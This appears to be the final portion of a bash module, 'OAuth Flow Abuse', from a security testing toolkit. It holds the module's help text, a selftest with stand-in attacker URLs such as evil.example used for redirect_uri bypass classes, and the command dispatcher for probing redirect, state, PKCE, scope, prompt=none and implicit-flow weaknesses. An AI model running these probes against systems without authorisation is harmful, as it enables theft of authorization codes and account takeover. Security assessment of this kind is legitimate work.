    command -v curl >/dev/null 2>&1 && curl_state="curl-ok" || curl_state="curl-missing"
    command -v jq   >/dev/null 2>&1 && jq_state="jq-ok"     || jq_state="jq-missing"
    printf '%s\t%s\t%s\t%s\tredirects-%s\ttests-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$jq_state" \
        "$(ou_redirects | wc -l | tr -d ' ')" \
        "$( (ou_state_tests; ou_pkce_tests; ou_scope_tests; ou_param_tests; ou_implicit_tests) | wc -l | tr -d ' ')"
}

ou_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

ou_cmd_help() {
    cat <<'HELP'
cloudsting module 45 — OAuth Flow Abuse v1.0.0
  --discover <base>                       read the issuer's own well-known document
  --check <base>                          discovery plus what the document admits
  --redirect <ep> <client> <redirect>     every redirect_uri variant, control first
  --state <ep> <client> <redirect>        is state a nonce or a decoration
  --pkce <base|ep> [client] [redirect]    is PKCE required, and is plain allowed
  --scope <ep> <client> <redirect> [s…]   scopes the client was never registered for
  --login-hint <ep> <client> <redirect>   auth-time parameters, incl. prompt=none
  --implicit <ep> <client> <redirect>     is response_type=token still on
  --cursor <ep> <client> <redirect> <code> [token-ep]
                                          exchange, replay, and read the token
  --redirects | --tests | --paths | --list
  --status-tsv | --menu | --selftest | --help

Every check sends a control first — the registered value, untouched — and
only calls something a bug when the control behaved and the variant did not.
A login page in the place of a redirect means the registration check was
never reached, and that is reported as login, never as a bypass.

Environment: OU_TIMEOUT (10), OU_FOLLOW (0), OU_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
ou_selftest() {
    cs_selftest_reset

    local n; n="$(ou_redirects | wc -l | tr -d ' ')"
    chk redir-many   "$( (( n >= 14 )) && echo many || echo few )" "many"
    chk redir-3col   "$(ou_redirects | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk redir-unique "$(ou_redirects | cut -f1 | sort -u | wc -l | tr -d ' ')" "$n"
    chk redir-kinds  "$(ou_redirects | awk -F'\t' '$2 !~ /^(control|prefix-match|parser-diff|substring-match|authority-confusion|param-bleed|scheme-check|registry-wildcard|indirect)$/{c++} END{print c+0}')" "0"
    chk redir-orig   "$(ou_redirects | awk -F'\t' '$1=="exact-orig"{print $2}')" "control"

    chk disc-paths   "$(ou_discovery_paths | wc -l | tr -d ' ')" "10"
    # `/.well-known` is the standard prefix; issuers that hang discovery off a
    # tenant path (/oauth/, /realms/, /connect/, /adfs/) are just as common, so
    # "dot" here means "path-borne discovery", not "literally starts with a dot"
    local wk_total wk_std
    wk_total="$(ou_discovery_paths | grep -c 'well-known')"
    wk_std="$(ou_discovery_paths | grep -c '^/\.well-known')"
    chk disc-total   "$wk_total" "9"
    chk disc-dot     "$wk_std" "3"
    chk disc-paths   "$(ou_discovery_paths | wc -l | tr -d ' ')" "10"
    chk state-tests  "$(ou_state_tests | wc -l | tr -d ' ')" "5"
    chk pkce-tests   "$(ou_pkce_tests | wc -l | tr -d ' ')" "4"
    chk scope-tests  "$(ou_scope_tests | wc -l | tr -d ' ')" "4"
    chk param-tests  "$(ou_param_tests | wc -l | tr -d ' ')" "6"
    chk impl-tests   "$(ou_implicit_tests | wc -l | tr -d ' ')" "3"

    # redirect verdicts
    chk v-rejected   "$(ou_redirect_verdict 400 '' 'https://a/cb' | cut -f1)" "rejected"
    chk v-rejected2  "$(ou_redirect_verdict 302 'https://a/cb?error=invalid_redirect_uri' 'https://a/cb' | cut -f1)" "rejected"
    chk v-rejected-err "$(ou_redirect_verdict 302 'https://a/cb?error=invalid_redirect_uri' 'https://a/cb' | cut -f2)" "invalid_redirect_uri"
    chk v-accepted   "$(ou_redirect_verdict 302 'https://a/cb?code=x' 'https://a/cb' | cut -f1)" "accepted"
    chk v-login      "$(ou_redirect_verdict 302 'https://a/login?next=x' 'https://a/cb' | cut -f1)" "login"
    chk v-reached    "$(ou_redirect_verdict 302 'https://evil.example/cb?code=x' 'https://a/cb' | cut -f1)" "reached"
    chk v-reached-loc "$(ou_redirect_verdict 302 'https://evil.example/cb?code=x' 'https://a/cb' | cut -f2)" "https://evil.example/cb?code=x"
    chk v-unreach    "$(ou_redirect_verdict 000 '' 'https://a/cb' | cut -f1)" "unreachable"
    chk v-absent     "$(ou_redirect_verdict 404 '' 'https://a/cb' | cut -f1)" "absent"
    chk v-error      "$(ou_redirect_verdict 500 '' 'https://a/cb' | cut -f1)" "error"
    chk v-inconcl    "$(ou_redirect_verdict 200 '' 'https://a/cb' | cut -f1)" "inconclusive"

    # redirect classes
    chk c-at         "$(ou_redirect_class 'https://cb.example@evil.example/x' 'https://cb.example/x')" "at-sign-confusion"
    chk c-sub        "$(ou_redirect_class 'https://evil.cb.example/x' 'https://cb.example/x')" "substring-match"
    chk c-hop        "$(ou_redirect_class 'https://cb.example/x/redirect?url=https://e.example' 'https://cb.example/x')" "open-redirect-hop"
    chk c-scheme     "$(ou_redirect_class 'http://cb.example/x' 'https://cb.example/x')" "scheme-downgrade"
    chk c-other      "$(ou_redirect_class 'https://cb.example/other' 'https://cb.example/x')" "registered-host-other-path"
    chk c-foreign    "$(ou_redirect_class 'https://evil.example/x' 'https://cb.example/x')" "foreign-host"
    chk c-none       "$(ou_redirect_class '' 'https://cb.example/x')" "none"

    # state / pkce / scope / param verdicts
    chk s-absent     "$(ou_state_verdict 1 0)" "state-absent"
    chk s-empty      "$(ou_state_verdict 0 0)" "state-empty"
    chk s-short      "$(ou_state_verdict 0 12)" "state-short"
    chk s-present    "$(ou_state_verdict 0 32)" "state-present"
    chk p-absent     "$(ou_pkce_verdict absent 0)" "pkce-absent"
    chk p-plain      "$(ou_pkce_verdict 'S256,plain' 0)" "pkce-plain"
    chk p-declared   "$(ou_pkce_verdict 'S256' 0)" "pkce-declared"
    chk p-supported  "$(ou_pkce_verdict 'S256' 43)" "pkce-supported"
    chk sc-admin     "$(ou_scope_verdict 'admin openid' 'admin' '')" "scope-admin"
    chk sc-wild      "$(ou_scope_verdict '* openid' '*' '')" "scope-wildcard"
    chk sc-reg       "$(ou_scope_verdict 'openid' 'openid' 'openid,profile')" "scope-registered"
    chk sc-any       "$(ou_scope_verdict 'profile' 'profile' 'openid')" "scope-any"
    chk sc-honest    "$(ou_scope_verdict '' 'profile' 'openid')" "scope-honest"
    chk pa-none      "$(ou_param_verdict 302 'https://a/cb?code=x' prompt-none)" "prompt-none-honoured"
    chk pa-respected "$(ou_param_verdict 302 'https://a/cb?error=login_required' prompt-none)" "prompt-respected"
    chk pa-rejected  "$(ou_param_verdict 400 '' prompt=none)" "rejected"
    chk pa-login     "$(ou_param_verdict 302 'https://a/login' prompt=login)" "login"
    chk pa-unreach   "$(ou_param_verdict 000 '' prompt=none)" "unreachable"

    # authorize request shape against a dead host
    local code loc bytes body
    cs_split "$(ou_authorize http://127.0.0.1:9 client 'https://a/cb')" code loc bytes body
    rm -f "$body"
    chk auth-dead-code "$code" "000"
    chk auth-dead-loc  "$loc" ""

    # usage errors, not crashes
    ou_cmd_discover 2>/dev/null;  chk disc-usage  "$?" "2"
    ou_cmd_redirect 2>/dev/null;  chk redir-usage "$?" "2"
    ou_cmd_state 2>/dev/null;     chk state-usage "$?" "2"
    ou_cmd_pkce 2>/dev/null;      chk pkce-usage  "$?" "2"
    ou_cmd_scope 2>/dev/null;     chk scope-usage "$?" "2"
    ou_cmd_login_hint 2>/dev/null; chk hint-usage "$?" "2"
    ou_cmd_cursor 2>/dev/null;    chk cursor-usage "$?" "2"
    ou_cmd_implicit 2>/dev/null;  chk impl-usage  "$?" "2"
    ou_cmd_check 2>/dev/null;     chk check-usage "$?" "2"

    # discovery against a dead host is absent, not a crash
    local out; out="$(ou_cmd_discover http://127.0.0.1:9 2>/dev/null)"
    chk disc-dead "$(printf '%s' "$out" | awk -F'\t' '$1=="DISCOVERY"{print $2}')" "absent"

    # shape contracts
    chk status-fields "$(ou_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(ou_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(ou_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(ou_cmd_help | head -1 | grep -ci 'OAuth Flow Abuse')" "1"
    chk list-rows     "$(ou_cmd_list | grep -c '^TEST')" "$( (ou_state_tests; ou_pkce_tests; ou_scope_tests; ou_param_tests; ou_implicit_tests) | wc -l | tr -d ' ')"
    chk redirlist-rows "$(ou_cmd_redirects | grep -c '^REDIRECT')" "$n"
    chk pathlist-rows "$(ou_cmd_discovery_paths | grep -c '^PATH')" "10"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --discover)    shift; ou_cmd_discover "$@";;
    --check)       shift; ou_cmd_check "$@";;
    --redirect)    shift; ou_cmd_redirect "$@";;
    --state)       shift; ou_cmd_state "$@";;
    --pkce)        shift; ou_cmd_pkce "$@";;
    --scope)       shift; ou_cmd_scope "$@";;
    --login-hint)  shift; ou_cmd_login_hint "$@";;
    --cursor)      shift; ou_cmd_cursor "$@";;
    --implicit)    shift; ou_cmd_implicit "$@";;
    --redirects)   ou_cmd_redirects;;
    --tests)       ou_cmd_tests;;
    --paths)       ou_cmd_discovery_paths;;
    --list)        ou_cmd_list;;
    --status-tsv|--status) ou_cmd_status_tsv;;
    --menu)        ou_cmd_menu;;
    --selftest)    ou_selftest;;
    *)             ou_cmd_help;;
esac
